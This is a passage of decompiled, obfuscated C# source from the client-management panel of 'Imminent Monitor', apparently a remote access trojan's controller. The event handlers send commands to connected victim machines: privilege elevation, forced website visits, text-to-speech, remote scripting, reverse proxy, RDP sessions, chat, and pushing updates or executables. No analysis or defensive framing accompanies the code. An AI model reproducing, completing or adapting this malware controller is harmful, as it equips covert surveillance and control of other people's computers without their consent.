        new Thread((ParameterizedThreadStart) (object_0 => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_5((GClass18) object_0)))
        {
          IsBackground = true
        }.Start((object) (GClass18) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_29(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_6((GClass18) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_30(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_7((GClass18) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_31(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_8((GClass18) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_32(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formChat_0))
        {
          FormChat formChat = new FormChat(tag);
          formChat.Show();
          tag.method_20().formChat_0 = formChat;
        }
        else
          this.method_54((Form) tag.method_20().formChat_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_33(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formMessageBox_0))
        {
          FormMessageBox formMessageBox = new FormMessageBox(tag);
          formMessageBox.Show();
          tag.method_20().formMessageBox_0 = formMessageBox;
        }
        else
          this.method_54((Form) tag.method_20().formMessageBox_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_34(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formMessageBox_0))
        {
          FormManagement formManagement = new FormManagement(tag);
          formManagement.Show();
          tag.method_20().formManagement_0 = formManagement;
        }
        else
          this.method_54((Form) tag.method_20().formMessageBox_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_35(object sender, EventArgs e)
  {
    string str = Interaction.InputBox("Please enter the website to visit", "Imminent Monitor", "https://");
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(Class97.gclass21_0.method_57(selectedItem.Name), new object[3]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Website,
          (object) str,
          (object) "1"
        });
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_36(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 gclass18_0 = Class97.gclass21_0.method_57(selectedItem.Name);
        if (Class97.smethod_22(gclass18_0.method_20().string_12, "4.4.1"))
        {
          dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
          {
            (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Elevate
          });
        }
        else
        {
          int num = (int) MessageBox.Show("This is an updated function, you cannot use this function unless you update your client", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_37(object sender, EventArgs e)
  {
    FormDialog formDialog = new FormDialog(false, "Text To Speach", "Please enter the text to be spoken");
    if (formDialog.ShowDialog((IWin32Window) this) != DialogResult.OK)
      return;
    string text = formDialog.vmethod_4().Text;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(Class97.gclass21_0.method_57(selectedItem.Name), new object[2]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.TextToSpeach,
          (object) text
        });
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_38(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().scriptingForm_0))
        {
          ScriptingForm scriptingForm = new ScriptingForm(tag);
          scriptingForm.Show();
          tag.method_20().scriptingForm_0 = scriptingForm;
        }
        else
          this.method_54((Form) tag.method_20().scriptingForm_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_39(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (Class97.smethod_22(tag.method_20().string_12, "3.9.5"))
        {
          if (!this.method_53((Form) tag.method_20().formProxy_0))
          {
            FormProxy formProxy = new FormProxy(tag);
            formProxy.Show();
            tag.method_20().formProxy_0 = formProxy;
          }
          else
            this.method_54((Form) tag.method_20().formProxy_0);
        }
        else
        {
          int num = (int) MessageBox.Show("The reverse proxy function has been updated, please rebuild your client and update your users to use it", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_40(bool bool_1, bool bool_2, bool bool_3, bool bool_4)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    List<GClass18> list_1 = new List<GClass18>();
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        list_1.Add(tag);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    FormExecuteUpdate formExecuteUpdate = new FormExecuteUpdate(list_1, bool_1, bool_2, bool_3, bool_4);
    formExecuteUpdate.Show();
    lock (list_1)
    {
      try
      {
        foreach (GClass18 gclass18 in list_1)
          gclass18.method_20().formExecuteUpdate_0 = formExecuteUpdate;
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
  }

  private void method_41(object sender, EventArgs e) => new Thread(new ThreadStart(this.method_43))
  {
    IsBackground = true
  }.Start();

  private void method_42(object sender, EventArgs e) => new Thread(new ThreadStart(this.method_44))
  {
    IsBackground = true
  }.Start();

  private void method_43()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      lock (Class97.list_0)
      {
        List<GClass18>.Enumerator enumerator = new List<GClass18>((IEnumerable<GClass18>) Class97.list_0).GetEnumerator();
        while (enumerator.MoveNext())
        {
          dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_5(enumerator.Current);
          Thread.Sleep(1);
        }
        enumerator.Dispose();
      }
label_9:
      num3 = 4;
      GC.Collect();
      goto label_16;
label_11:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
            case 4:
              goto label_9;
            case 5:
              goto label_16;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_11;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_16:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void method_44()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      lock (Class97.list_0)
      {
        List<GClass18>.Enumerator enumerator = new List<GClass18>((IEnumerable<GClass18>) Class97.list_0).GetEnumerator();
        while (enumerator.MoveNext())
        {
          dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(enumerator.Current, new object[1]
          {
            (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.UpdateInfo
          });
          Thread.Sleep(1);
        }
        enumerator.Dispose();
      }
label_9:
      num3 = 4;
      GC.Collect();
      goto label_16;
label_11:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
            case 4:
              goto label_9;
            case 5:
              goto label_16;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_11;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_16:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void method_45()
  {
    while (true)
    {
      try
      {
        try
        {
          foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
          {
            if (gclass18.long_0 <= 0L && !gclass18.method_12())
            {
              gclass18.method_32();
              gclass18.long_0 = 0L;
            }
            Thread.Sleep(1);
          }
        }
        finally
        {
          List<GClass18>.Enumerator enumerator;
          enumerator.Dispose();
        }
        Thread.Sleep(30000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void method_46() => Class97.smethod_15(this.vmethod_0());

  private void method_47()
  {
    if (this.DesignMode)
      return;
    List<ToolStripMenuItem> list_2 = new List<ToolStripMenuItem>();
    int num = this.vmethod_0().Items.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if ((object) this.vmethod_0().Items[index].GetType() != (object) typeof (ToolStripSeparator))
        Class97.smethod_13((ToolStripMenuItem) this.vmethod_0().Items[index], ref list_2);
    }
    try
    {
      foreach (ToolStripMenuItem toolStripMenuItem in list_2)
        toolStripMenuItem.Image = Class97.smethod_5(toolStripMenuItem.Text);
    }
    finally
    {
      List<ToolStripMenuItem>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_48()
  {
    if (LicenseManager.UsageMode != LicenseUsageMode.Runtime)
      return;
    foreach (string file in Directory.GetFiles(string.Format("{0}\\Resources\\Images\\Countrys\\", (object) Application.StartupPath)))
      this.vmethod_38().Images.Add(new FileInfo(file).Name, Image.FromFile(file));
    foreach (string file in Directory.GetFiles(string.Format("{0}\\Resources\\Images\\Listview\\", (object) Application.StartupPath)))
      this.vmethod_38().Images.Add(new FileInfo(file).Name, Image.FromFile(file));
  }

  public int method_49(string string_0)
  {
    if (string_0 == null)
      return 0;
    int num = this.vmethod_38().Images.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if (this.vmethod_38().Images.Keys[index].ToLower().Contains(string_0.ToLower()))
        return index;
    }
    return 0;
  }

  public int method_50(string string_0) => this.vmethod_38().Images.IndexOfKey(string_0 + ".png");

  public string method_51(int int_0) => new TimeSpan(0, 0, int_0).ToString();

  public bool method_52(string string_0) => this.vmethod_108().Groups.Cast<ListViewGroup>().Any<ListViewGroup>(new Func<ListViewGroup, bool>(new UserControlClients.Class140()
  {
    string_0 = string_0
  }._Lambda\u0024__69));

  public bool method_53(Form form_0) => form_0 != null && !form_0.IsDisposed;

  public void method_54(Form form_0)
  {
    if (form_0.WindowState == FormWindowState.Minimized)
      form_0.WindowState = FormWindowState.Normal;
    form_0.BringToFront();
  }

  private void method_55(object sender, LinkLabelLinkClickedEventArgs e) => this.vmethod_44().SelectedIndex = 1;

  private void method_56(object sender, LinkLabelLinkClickedEventArgs e) => this.vmethod_44().SelectedIndex = 0;

  private void method_57(object sender, EventArgs e)
  {
    string str = Interaction.InputBox("Enter an IP Address", "Search", string.Empty);
    if (Operators.CompareString(str, string.Empty, false) == 0)
      return;
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_108().Items)
      {
        if (Operators.CompareString(listViewItem.SubItems[9].Text, str, false) == 0)
        {
          this.vmethod_108().Items[listViewItem.Index].Selected = true;
          this.vmethod_108().Items[listViewItem.Index].EnsureVisible();
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_58(object sender, EventArgs e)
  {
    string Left = Interaction.InputBox("Enter a Username", "Search", string.Empty);
    if (Operators.CompareString(Left, string.Empty, false) == 0)
      return;
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_108().Items)
      {
        if (Operators.CompareString(listViewItem.SubItems[2].Text.ToLower(), Left.ToLower(), false) == 0)
        {
          this.vmethod_108().Items[listViewItem.Index].Selected = true;
          this.vmethod_108().Items[listViewItem.Index].EnsureVisible();
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_59(object sender, EventArgs e)
  {
    if (this.vmethod_82().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_82().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_5((string) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_82().SelectedItems)
        this.vmethod_82().Items.Remove(selectedItem);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_60(object sender, EventArgs e)
  {
    if (this.queue_0.Count <= 0 || !this.method_61())
      return;
    this.method_12(this.queue_0.Dequeue());
  }

  private bool method_61()
  {
    int num = Class97.formToast_0.Length - 1;
    for (int index = 0; index <= num; ++index)
    {
      if (Class97.formToast_0[index] == null)
        return true;
    }
    return false;
  }

  private void method_62(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    int num = (int) new FormNotes((GClass18) this.vmethod_108().SelectedItems[0].Tag).ShowDialog();
  }

  private void method_63(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (Class97.smethod_22(tag.method_20().string_12, "4.5.1"))
        {
          if (!this.method_53((Form) tag.method_20().formWindowsRDP_0))
          {
            FormWindowsRDP formWindowsRdp = new FormWindowsRDP(tag);
            formWindowsRdp.Show();
            tag.method_20().formWindowsRDP_0 = formWindowsRdp;
          }
          else
            this.method_54((Form) tag.method_20().formWindowsRDP_0);
        }
        else
        {
          int num = (int) MessageBox.Show("Please update this client use the Windows RDP feature", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_64(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2((GClass18) selectedItem.Tag, new object[1]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.UpdateInfo
        });
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  internal sealed class Class138
  {
    public GClass18 gclass18_0;
    public UserControlClients userControlClients_0;

    internal sealed class Class139
    {
      public ListViewItem listViewItem_0;
      public UserControlClients.Class138 class138_0;

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__66() => this.class138_0.userControlClients_0.method_6(this.class138_0.gclass18_0, this.listViewItem_0, this.class138_0.userControlClients_0.method_7());
    }
  }

  internal sealed class Class140
  {
    public string string_0;

    [CompilerGenerated]
    [SpecialName]
    public bool _Lambda\u0024__69(ListViewGroup listViewGroup_0) => Operators.CompareString(listViewGroup_0.Header, this.string_0, false) == 0;
  }

  private delegate void Delegate18(ListViewItem listViewItem_0);
}
